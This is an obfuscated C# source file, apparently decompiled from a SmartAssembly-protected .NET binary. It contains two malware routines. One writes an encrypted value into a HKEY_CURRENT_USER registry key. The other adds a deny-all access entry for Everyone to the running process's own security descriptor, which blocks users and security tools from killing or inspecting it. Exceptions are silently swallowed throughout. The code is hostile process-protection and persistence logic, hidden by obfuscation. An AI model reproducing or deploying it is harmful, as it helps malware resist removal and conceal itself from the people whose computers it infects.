using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace InTDhhOfzy;

internal sealed class xBghGCMDwDv
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr GJHWRmePbolky, int iOYopOJbrzVRWb, [Out] byte[] blYyMrjwnvfdoEG, uint QCBkqaUdtt, out uint woKzJystFmiE);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr xikTnCBiKRA, int FpHKGBSLEaXOZm, [In] byte[] aEORnSziqPs);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void nWQZHYlPeRW(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107409849)));
			registryKey.SetValue(atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107409232)), getString_0(107410449));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor kcGSDqDGdw(IntPtr intptr_0)
	{
		byte[] blYyMrjwnvfdoEG = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, blYyMrjwnvfdoEG, 0u, out var woKzJystFmiE);
		if ((long)woKzJystFmiE > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, blYyMrjwnvfdoEG = new byte[woKzJystFmiE], woKzJystFmiE, out woKzJystFmiE))
		{
			return null;
		}
		return new RawSecurityDescriptor(blYyMrjwnvfdoEG, 0);
	}

	private void uojSRWklGrWE(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void DXcWZJytpBYp()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = kcGSDqDGdw(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			uojSRWklGrWE(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static xBghGCMDwDv()
	{
		Strings.CreateGetStringDelegate(typeof(xBghGCMDwDv));
	}
}
